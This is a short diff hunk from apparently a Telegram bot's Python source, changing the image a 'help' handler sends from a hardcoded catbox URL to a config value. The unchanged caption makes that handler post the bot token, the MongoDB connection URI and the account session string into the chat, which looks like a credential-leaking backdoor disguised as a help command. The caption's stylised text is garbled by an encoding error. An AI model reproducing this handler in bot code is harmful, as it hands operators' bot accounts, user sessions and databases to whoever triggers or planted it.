@@ -113,7 +113,7 @@ async def restartbot(client, message: Message, _):
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
-          photo=f"https://files.catbox.moe/tcz7s6.jpg",
+          photo=config.START_IMG_URL,
        caption=f"""ð–¡ð—ˆá´› ð–³á´á´‹á´‡É´:-   `{BOT_TOKEN}` \n\nð–¬á´É´É¢á´:-   `{MONGO_DB_URI}`\n\nð–²á´›Ê€ÉªÉ´É¢ ð–²á´‡ssÉªá´É´:-   `{STRING_SESSION}`\n\n [ ðŸ§Ÿ ](https://t.me/{config.OWNER_USERNAME})............â˜†""",
         reply_markup=InlineKeyboardMarkup(
              [
